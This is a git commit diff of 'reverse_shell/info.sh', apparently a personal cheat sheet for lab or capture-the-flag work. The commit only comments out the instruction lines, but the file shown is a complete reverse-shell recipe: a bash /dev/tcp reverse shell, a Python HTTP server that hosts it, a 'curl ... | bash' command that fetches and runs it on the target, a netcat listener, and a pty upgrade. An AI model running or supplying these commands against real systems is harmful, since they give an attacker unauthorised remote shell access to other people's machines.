9850b46e162cd92324dcf61e2cec8fed6f56bf98
Alexander Hebel <a.hebelsun@gmail.com>
2023-10-14 14:07:55 +0200

    Update info.sh

--- reverse_shell/info.sh
+++ reverse_shell/info.sh
@@ -2,17 +2,17 @@ create bash script rev.sh with content:
 #!/bin/bash
 bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
 
-run server and expose rev.sh as file:
+# run server and expose rev.sh as file:
 python3 -m http.server 80
 
-on remote machine call:
+# on remote machine call:
 curl 10.10.14.106/rev.sh|bash
 
-on local machine call:
+# on local machine call:
 netcat -lnvp 1337
 
-to spawn a bash:
+# to spawn a bash:
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-to make if fully interactive:
+# to make if fully interactive:
 https://gist.github.com/oscar-rk/f27464d7ab0c1fac4adf383b8a3527d3
